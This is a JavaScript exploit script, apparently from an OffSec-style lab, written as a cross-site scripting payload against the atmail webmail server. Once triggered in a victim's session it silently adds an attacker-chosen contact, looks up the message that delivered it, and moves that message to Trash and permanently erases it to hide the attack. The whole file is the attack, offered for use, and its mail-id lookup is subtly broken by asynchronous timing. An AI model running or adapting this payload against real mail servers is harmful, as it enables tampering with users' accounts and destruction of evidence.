// Author: Youssef B.
// XSS exploit against atmail mail server. This script adds a contact when the xss is triggered (via sendmail) then delete the mail from the victim mailbox.

var mailid;
var jsonresp;

function read_body(xhr) {
    var data;
    if (!xhr.responseType || xhr.responseType === "text") {
        data = xhr.responseText;
    } else if (xhr.responseType === "document") {
        data = xhr.responseXML;
    } else if (xhr.responseType === "json") {
        data = xhr.responseJSON;
    } else {
        data = xhr.response;
    }

    return data;
}

function add_contact()
{
    var uname          = "bobsponge2";
    var lastname       = "hacked";
    var emailFieldName = "UserEmail";
    var email          = "pwn@offsec.local";

    var uri = "/index.php/mail/contacts/updatecontact";
    var query_string = "?contact[UserFirstName]=" + uname + "&contact[UserLastName]=" + lastname + "&contact[emailFieldName][]=" + emailFieldName + "&contact[emailValue][]=" + email;

    var xaddc = new XMLHttpRequest();
    xaddc.open("GET", uri + query_string, true);
    xaddc.send(null);
}

function get_mailid()
{
    var uri = "/index.php/mail/mail/listfoldermessages/selectFolder/INBOX";

    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE && xhr.status == 200) {
            var body = read_body(xhr);
            jsonresp = JSON.parse(body);
        }

        target = jsonresp.q[1].a[0][0];

        var wrapper = document.createElement('div');
        wrapper.innerHTML= target;
    
        var x = document.getElementsByName("mailId[]");
        if (x[0].type == "checkbox") {
            mailid = x[0].value;
        }
    }
    xhr.open("GET", uri, true);
    xhr.send(null);

    return mailid;
}

function delete_mail(mailid) {
    var uri = "/index.php/mail/mail/movetofolder/fromFolder/INBOX/toFolder/INBOX.Trash";
    var query_string = "?mailId[]=" + mailid;

    var url = "/index.php/mail/mail/movetofolder/fromFolder/INBOX.Trash/toFolder/INBOX.Trash/actuallyDelete/1";
    var query_string2 = "?mailId[]=" + mailid;

    var xdelm = new XMLHttpRequest();
    xdelm.open("GET", uri + query_string, true);
    xdelm.send(null);

    var xerase = new XMLHttpRequest();
    xerase.open("GET", url + query_string2, true);
    xerase.send(null);
}

add_contact();
var mid = get_mailid();

console.log(mid);

delete_mail(mid);
